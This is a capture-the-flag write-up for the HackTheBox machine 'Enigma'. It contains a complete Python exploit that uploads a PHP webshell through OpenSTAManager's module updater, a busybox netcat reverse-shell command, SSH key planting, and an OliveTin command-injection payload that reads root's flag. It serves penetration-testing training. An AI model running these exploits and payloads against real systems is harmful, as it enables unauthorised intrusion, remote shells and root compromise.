---
title: "HackTheBox — Enigma"
date: 2026-09-01 12:00:00 +0200
categories: [HackTheBox]
tags: [htb, nfs, openstamanager, rce, olivetin, command-injection, linux]
description: "Writeup for Enigma, an easy Linux box involving NFS credential leakage, mail pivoting, OpenSTAManager RCE, and OliveTin command injection as root."
---

## Overview

Enigma is an easy-difficulty Linux machine on HackTheBox. The attack chain starts with a world-readable NFS share leaking onboarding credentials, which leads to a mail account. From there we pivot through a second mailbox to find admin credentials for an internal OpenSTAManager instance. We exploit a known RCE in that application to land a shell as `www-data`, dump database credentials, crack a bcrypt hash to move laterally to `haris`, and finally abuse a misconfigured OliveTin instance running as root to read the root flag.

```
NFS (world-readable) → onboarding PDF → webmail creds (kevin)
  → sarah's mailbox (password reuse) → OpenSTAManager admin creds
    → RCE via CVE-2026-38751 → www-data
      → DB creds → bcrypt crack → haris (user.txt)
        → OliveTin argument injection → root (root.txt)
```

---

## Reconnaissance

```bash
nmap -sCV -Pn --min-rate 5000 -p- 10.129.4.175
```

Relevant ports:

| Port | Service | Notes |
|------|---------|-------|
| 22 | SSH (OpenSSH 9.6p1) | Standard, nothing interesting |
| 80 | HTTP (nginx 1.24.0) | Redirect to `http://enigma.htb/` |
| 110/143/993/995 | Dovecot POP3/IMAP | Full mail stack, TLS cert CN=`enigma` |
| 111 | rpcbind | Exposes NFS, mountd, nlockmgr |
| 2049 | NFS | NFSv3/4 with nfs_acl |

The HTTP redirect tells us we need `enigma.htb` in `/etc/hosts`. The NFS share is the obvious first target — it's usually misconfigured on these boxes and this one is no exception.

---

## NFS — Credential Leakage

```bash
showmount -e 10.129.4.175
# /srv/nfs/onboarding *
```

Exported to `*`, zero access control. Mount and check:

```bash
sudo mount -t nfs 10.129.4.175:/srv/nfs/onboarding ./onboarding -o nolock
ls -la onboarding/
```

Inside was `New_Employee_Access.pdf` with plaintext credentials for a new employee:

```
Webmail Access
URL: http://mail001.enigma.htb
Username: kevin
Password: Enigma2024!
```

Added both `enigma.htb` and `mail001.enigma.htb` to `/etc/hosts`.

---

## Mail Pivoting — kevin → sarah → admin

Logged into `http://mail001.enigma.htb` as `kevin / Enigma2024!`. The inbox had a welcome email from `sarah@enigma.htb` in the Accounts department — nothing actionable, but it revealed another user.

Tried the same default password for Sarah — worked. Default credentials not being rotated is depressingly common, and on a box themed around onboarding it makes perfect sense.

Sarah's inbox had a message from IT Support with credentials for an internal support portal:

```
URL: http://support_001.enigma.htb
Username: admin
Password: Ne3s4rtars78s
```

---

## Initial Foothold — OpenSTAManager RCE

### The underscore problem

Before even looking at the application, there's a practical obstacle: `support_001.enigma.htb` contains underscores. RFC 952 doesn't allow underscores in hostnames, and `glibc` enforces this — meaning `ping`, `curl`, browsers, and basically everything that calls `getaddrinfo()` will refuse to resolve it, even if it's in `/etc/hosts`.

```bash
# This fails despite being in /etc/hosts
ping support_001.enigma.htb
# ping: support_001.enigma.htb: Name or service not known

# curl --resolve bypasses glibc entirely
curl -s --resolve support_001.enigma.htb:80:10.129.4.175 http://support_001.enigma.htb
```

For the browser, the fix is configuring **Burp Suite → Settings → Network → Connections → Hostname Resolution Overrides** to map `support_001.enigma.htb → 10.129.4.175`, then proxying through Burp. For the exploit script, I patched the DNS resolution at the `urllib3` level (more on that below).

### Application fingerprinting

The login page identified the application as **OpenSTAManager v2.9.8** — an open-source Italian ERP for technical assistance and invoicing. Logged in with the admin credentials from Sarah's email.

This version is vulnerable to **CVE-2026-38751**, an authenticated RCE through the module update mechanism. The upload endpoint at `/modules/aggiornamenti/upload_modules.php` accepts a ZIP file containing a module definition and its PHP files, which get extracted to `/modules/<directory>/` under the webroot without any validation on the PHP content. By uploading a module with a webshell, we get code execution as `www-data`.

### Exploit

I wrote a Python exploit that automates the full chain (login → enable updates → upload malicious module → verify RCE) and also handles the underscore DNS issue by monkey-patching `urllib3`'s connection layer:

```python
#!/usr/bin/env python3
"""
OpenSTAManager RCE Exploit (CVE-2026-38751)
Bypasses glibc underscore DNS restriction via urllib3 monkey-patch.
"""

import argparse
import io
import sys
import time
import zipfile
from urllib.parse import quote, urlparse

import requests
import urllib3.util.connection

# -- DNS bypass: glibc rejects underscores, so we intercept at the
#    socket level before the system resolver ever sees the hostname.
RESOLVE_MAP = {}
_orig_create_connection = urllib3.util.connection.create_connection

def _patched_create_connection(address, *args, **kwargs):
    host, port = address
    if host in RESOLVE_MAP:
        host = RESOLVE_MAP[host]
    return _orig_create_connection((host, port), *args, **kwargs)

urllib3.util.connection.create_connection = _patched_create_connection


class Exploit:
    def __init__(self, url, username, password):
        self.url = url.rstrip("/")
        self.username = username
        self.password = password
        self.session = requests.Session()
        self.session.timeout = 10
        self.shell_path = "/modules/shell/shell.php"
        self.shell_url = f"{self.url}{self.shell_path}"

    def login(self):
        self.session.get(f"{self.url}/index.php")
        resp = self.session.post(
            f"{self.url}/index.php?op=login",
            data={"username": self.username, "password": self.password},
            allow_redirects=True,
        )
        if "op=login" in resp.url or resp.url.rstrip("/").endswith("index.php"):
            print("[-] Login failed")
            return False
        print(f"[+] Logged in as {self.username}")
        return True

    def enable_updates(self):
        self.session.post(
            f"{self.url}/ajax.php?a=check_module_updates_settings",
            data={"Attiva aggiornamenti": "1"},
        )
        print("[+] Module updates enabled")

    def upload_shell(self):
        module_cfg = ('name = "shell"\ndirectory = "shell"\nversion = "1.0"\n'
                      'compatibility = "2.10"\noptions = ""\n'
                      'icon = "fa fa-bug"\nparent = "Dashboard"\n')
        webshell = '<?php if(isset($_GET["c"])){echo "<pre>";system($_GET["c"]);echo "</pre>";} ?>'

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zf:
            zf.writestr("shell/MODULE", module_cfg)
            zf.writestr("shell/shell.php", webshell)

        resp = self.session.post(
            f"{self.url}/modules/aggiornamenti/upload_modules.php",
            files={"blob": ("update.zip", buf.getvalue(), "application/zip")},
        )
        ok = resp.status_code in (200, 500)
        print(f"[{'+'if ok else '-'}] Upload: {resp.status_code}")
        return ok

    def verify(self):
        for _ in range(5):
            time.sleep(1)
            try:
                resp = self.session.get(self.shell_url, params={"c": "id"}, timeout=5)
                if resp.ok and "uid=" in resp.text:
                    print(f"[+] RCE confirmed: {self.shell_url}?c=CMD")
                    return True
            except requests.RequestException:
                pass
        return False

    def execute(self, cmd):
        resp = self.session.get(self.shell_url, params={"c": cmd}, timeout=10)
        return resp.text.replace("<pre>", "").replace("</pre>", "").strip()

    def interactive(self):
        print("[*] Interactive shell (type 'exit' to quit)")
        while True:
            try:
                cmd = input("$ ").strip()
            except (EOFError, KeyboardInterrupt):
                break
            if cmd in ("exit", "quit"):
                break
            if cmd:
                print(self.execute(cmd))


def main():
    p = argparse.ArgumentParser(description="OpenSTAManager RCE (CVE-2026-38751)")
    p.add_argument("-t", "--target", required=True)
    p.add_argument("-U", "--user", required=True)
    p.add_argument("-P", "--password", required=True)
    p.add_argument("--resolve", metavar="IP", help="Resolve hostname to IP (underscore bypass)")
    p.add_argument("-i", "--interactive", action="store_true")
    args = p.parse_args()

    hostname = urlparse(args.target).hostname
    if args.resolve:
        RESOLVE_MAP[hostname] = args.resolve
    elif "_" in (hostname or ""):
        # Try /etc/hosts fallback
        with open("/etc/hosts") as f:
            for line in f:
                parts = line.strip().split()
                if len(parts) >= 2 and hostname in parts[1:]:
                    RESOLVE_MAP[hostname] = parts[0]
                    break
            else:
                sys.exit(f"[!] Use --resolve IP for underscore hostname '{hostname}'")

    e = Exploit(args.target, args.user, args.password)
    if not e.login():
        return
    e.enable_updates()
    if not e.upload_shell():
        return
    if not e.verify():
        return

    if args.interactive:
        e.interactive()
    else:
        print(e.execute("id"))


if __name__ == "__main__":
    main()
```

Running it:

```bash
python3 exploit.py -t http://support_001.enigma.htb \
    -U admin -P 'Ne3s4rtars78s' \
    --resolve 10.129.4.175 -i
```

```
[+] Logged in as admin
[+] Module updates enabled
[+] Upload: 200
[+] RCE confirmed: http://support_001.enigma.htb/modules/shell/shell.php?c=CMD
[*] Interactive shell (type 'exit' to quit)
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

For a proper reverse shell, I used busybox nc through the webshell and caught it with [Penelope](https://github.com/brightio/penelope):

```bash
# Attacker
penelope -p 4444

# Through the webshell
$ busybox nc 10.10.14.64 4444 -e /bin/bash
```

---

## Lateral Movement — haris

### Database credentials

The OpenSTAManager config file had database credentials in plaintext:

```bash
www-data@enigma:~$ cat /var/www/html/openstamanager/config.inc.php
```

```php
$db_host = 'localhost';
$db_username = 'brollin';
$db_password = 'Fri3nds@9099';
$db_name = 'openstamanager';
```

### Hash extraction and cracking

```bash
www-data@enigma:~$ mysql -u brollin -p'Fri3nds@9099' -D openstamanager \
    -e "select username,password from zz_users;"
```

```
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| haris    | $2y$10$WHf1T79sxjsZongUKT2jGeexTkvihBQyCZeoYXmObiNphrsZDr6eC |
+----------+--------------------------------------------------------------+
```

Cracked with hashcat in seconds — it's in rockyou:

```bash
hashcat -m 3200 haris.hash /usr/share/wordlists/rockyou.txt
# $2y$10$WHf1T79sxjsZong... : bestfriends
```

### SSH access

We have `haris : bestfriends` but rather than just `su`, I wanted a clean SSH session. The problem is that `haris` didn't have an `authorized_keys` file set up, so I generated a keypair and wrote the public key from the `www-data` shell:

```bash
# On attacker machine
ssh-keygen -t ed25519 -f enigma_haris -N '' -C 'haris@enigma'
cat enigma_haris.pub
```

```bash
# On target as www-data (su to haris first)
su - haris
# Password: bestfriends

mkdir -p ~/.ssh
chmod 700 ~/.ssh
echo 'ssh-ed25519 AAAA...<pubkey>... haris@enigma' > ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
```

Now we have a stable SSH session:

```bash
ssh -i enigma_haris haris@10.129.4.175
haris@enigma:~$ cat user.txt
5e4f89fe************************
```

---

## Privilege Escalation — OliveTin

### Internal enumeration

Checking for internal services:

```bash
haris@enigma:~$ ss -tlnp
# ...
# 127.0.0.1:1337   LISTEN
```

Port 1337 on localhost — poking at it:

```bash
curl -s http://127.0.0.1:1337 | head -5
```

The response contained the signature `OliveTin` meta description: *"Give safe and simple access to predefined shell commands from a web interface."* [OliveTin](https://github.com/OliveTin/OliveTin) lets you expose shell commands as buttons on a web UI. If the command templates aren't properly sanitised, the "safe" part goes out the window.

### Configuration

```bash
cat /etc/OliveTin/config.yaml
```

One of the defined actions was `backup_database`, which takes three user-supplied arguments (`db_user`, `db_pass`, `db_name`) and substitutes them directly into a shell command. There's no quoting, no escaping — classic argument injection.

### Command injection

The `db_pass` field gets interpolated into the command string as-is. By injecting a quote to close the argument context followed by arbitrary commands, we execute as whatever user OliveTin runs as — which turned out to be `root`.

```python
import requests, time, subprocess

payload = {
    "bindingId": "backup_database",
    "uniqueExecutionId": "pwned",
    "arguments": [
        {"name": "db_user", "value": "x"},
        {"name": "db_pass", "value": "x' ; cp /root/root.txt /tmp/r.txt ; chmod 644 /tmp/r.txt ; echo '"},
        {"name": "db_name", "value": "x"}
    ]
}

requests.post("http://127.0.0.1:1337/api/v1/StartAction", json=payload, timeout=10)
time.sleep(3)
print(subprocess.check_output("cat /tmp/r.txt", shell=True).decode().strip())
```

```
haris@enigma:~$ python3 privesc.py
38af01062************************
```

Root.

---

## Flags

| Flag | Hash |
|------|------|
| user.txt | `5e4f89fe************************` |
| root.txt | `38af01062************************` |
